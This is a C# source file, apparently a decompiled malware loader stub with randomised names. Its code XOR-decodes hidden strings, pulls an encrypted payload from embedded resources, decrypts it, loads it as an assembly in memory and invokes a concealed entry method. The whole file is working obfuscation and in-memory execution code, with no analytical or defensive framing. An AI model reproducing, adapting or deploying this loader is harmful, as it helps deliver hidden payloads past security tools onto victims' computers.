using System;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;

namespace EotQMjd;

internal static class ObWmxkiqtSvB
{
	private static byte[] NUtvXfCDNU = new byte[24]
	{
		153, 129, 123, 157, 199, 125, 78, 108, 247, 154,
		12, 124, 239, 88, 230, 236, 41, 202, 81, 183,
		86, 45, 62, 16
	};

	private static byte[] sYWcvLzmczqAFAHpCR(byte[] xVtIVaTeCacqMi, byte[] WghElmfuIk)
	{
		for (int i = 0; i < xVtIVaTeCacqMi.Length; i++)
		{
			for (int j = 0; j < WghElmfuIk.Length; j++)
			{
				xVtIVaTeCacqMi[i] = (byte)(xVtIVaTeCacqMi[i] ^ WghElmfuIk[j]);
			}
		}
		return xVtIVaTeCacqMi;
	}

	private static void Main(string[] args)
	{
		new ManualResetEvent(initialState: false).WaitOne(0);
		object ftcqAzG = TZYqSpPGCHhnEg();
		string text = "";
		for (byte b = 0; b < 67; b = (byte)(b + 1))
		{
			text += YEfJJKPvFfIEvbD(ftcqAzG, lVkXEXKSuU("247#221#224#249#208#242#242#239#227#211#217#248#228#240", NUtvXfCDNU) + b);
		}
		byte[] array = new byte[text.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)text[i];
		}
		array = sYWcvLzmczqAFAHpCR(array, NUtvXfCDNU);
		Assembly yzedyFGjpxsrPomZnGr = YDIFbMozBNS(array);
		Type lsNXnUXdAiXXvZBdVn = mjQsxsWZs(yzedyFGjpxsrPomZnGr);
		MethodInfo methodInfo = HDBMF(lsNXnUXdAiXXvZBdVn, lVkXEXKSuU("207#253#219#210#211#211#251#209#231#254#218#248#192#225#254#192#206#250", NUtvXfCDNU), dZGfHoaLaAbpFv(typeof(string[]), Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#197#226#228#255#248#241", NUtvXfCDNU)), Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#197#226#228#255#248#241", NUtvXfCDNU)), typeof(byte[])));
		methodInfo.Invoke(null, new object[4]
		{
			args,
			lVkXEXKSuU("212#193#220#248#213#219#223#240#206#198#207#253#208#221#249#212#192#216#252", NUtvXfCDNU),
			lVkXEXKSuU("215#226#207#251#198#213#245#236#239#199#220#243#231#207#239#255#236#222#241", NUtvXfCDNU),
			NUtvXfCDNU
		});
	}

	private static Type[] dZGfHoaLaAbpFv(params Type[] YcZbwEkDCgfbJFr)
	{
		List<Type> list = new List<Type>(YcZbwEkDCgfbJFr);
		return list.ToArray();
	}

	private static MethodInfo HDBMF(Type LsNXnUXdAiXXvZBdVn, string aNqcVxRzSLLNESxzuqT, Type[] YcZbwEkDCgfbJFr)
	{
		MethodInfo[] methods = LsNXnUXdAiXXvZBdVn.GetMethods();
		MethodInfo result = null;
		MethodInfo[] array = methods;
		foreach (MethodInfo methodInfo in array)
		{
			if (!(methodInfo.Name == aNqcVxRzSLLNESxzuqT))
			{
				continue;
			}
			ParameterInfo[] parameters = methodInfo.GetParameters();
			if (parameters.Length == YcZbwEkDCgfbJFr.Length)
			{
				int j;
				for (j = 0; j < parameters.Length && (object)parameters[j].ParameterType == YcZbwEkDCgfbJFr[j]; j++)
				{
				}
				if (j == parameters.Length)
				{
					result = methodInfo;
				}
			}
		}
		return result;
	}

	private static string lVkXEXKSuU(string LsNXnUXdAiXXvZBdVn, byte[] WghElmfuIk)
	{
		string[] array = LsNXnUXdAiXXvZBdVn.Split(new char[1] { '#' });
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = byte.Parse(array[i]);
		}
		array2 = sYWcvLzmczqAFAHpCR(array2, WghElmfuIk);
		string text = "";
		byte[] array3 = array2;
		foreach (byte b in array3)
		{
			text += (char)b;
		}
		return text;
	}

	private static string YEfJJKPvFfIEvbD(object FtcqAzG, string aNqcVxRzSLLNESxzuqT)
	{
		Type type = Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#229#249#227#228#245#243#229#184#196#243#229#249#227#228#245#243#219#247#248#247#241#243#228", NUtvXfCDNU));
		MethodInfo methodInfo = HDBMF(type, lVkXEXKSuU("209#243#226#197#226#228#255#248#241", NUtvXfCDNU), dZGfHoaLaAbpFv(typeof(string)));
		return (string)methodInfo.Invoke(FtcqAzG, new object[1] { aNqcVxRzSLLNESxzuqT });
	}

	private static Assembly YDIFbMozBNS(byte[] xVtIVaTeCacqMi)
	{
		Type type = Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#240#250#243#245#226#255#249#248#184#215#229#229#243#251#244#250#239", NUtvXfCDNU));
		MethodInfo methodInfo = HDBMF(type, lVkXEXKSuU("218#249#247#242", NUtvXfCDNU), new Type[1] { typeof(byte[]) });
		return (Assembly)methodInfo.Invoke(null, new object[1] { xVtIVaTeCacqMi });
	}

	private static Type mjQsxsWZs(Assembly YzedyFGjpxsrPomZnGr)
	{
		Type type = Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#240#250#243#245#226#255#249#248#184#215#229#229#243#251#244#250#239", NUtvXfCDNU));
		MethodInfo methodInfo = HDBMF(type, lVkXEXKSuU("209#243#226#194#239#230#243", NUtvXfCDNU), dZGfHoaLaAbpFv(typeof(string)));
		return (Type)methodInfo.Invoke(YzedyFGjpxsrPomZnGr, new object[1] { lVkXEXKSuU("207#223#253#222#219#194#211#206#238#218#220#253#206#184#247#221#255#198#207#192#222#217#197#197#244#198#225#216", NUtvXfCDNU) });
	}

	private static Assembly GmEWQihTBettZHYYSa()
	{
		Type type = Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#240#250#243#245#226#255#249#248#184#215#229#229#243#251#244#250#239", NUtvXfCDNU));
		MethodInfo methodInfo = HDBMF(type, lVkXEXKSuU("209#243#226#211#238#243#245#227#226#255#248#241#215#229#229#243#251#244#250#239", NUtvXfCDNU), new Type[0]);
		return (Assembly)methodInfo.Invoke(null, null);
	}

	private static object TZYqSpPGCHhnEg()
	{
		Type type = Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#229#249#227#228#245#243#229#184#196#243#229#249#227#228#245#243#219#247#248#247#241#243#228", NUtvXfCDNU));
		ConstructorInfo constructor = type.GetConstructor(dZGfHoaLaAbpFv(typeof(string), Type.GetType(lVkXEXKSuU("197#239#229#226#243#251#184#196#243#240#250#243#245#226#255#249#248#184#215#229#229#243#251#244#250#239", NUtvXfCDNU))));
		return constructor.Invoke(BindingFlags.CreateInstance, null, new object[2]
		{
			lVkXEXKSuU("212#193#220#248#213#219#223#240#206#198#207#253#208#221#249#212#192#216#252", NUtvXfCDNU),
			GmEWQihTBettZHYYSa()
		}, null);
	}
}
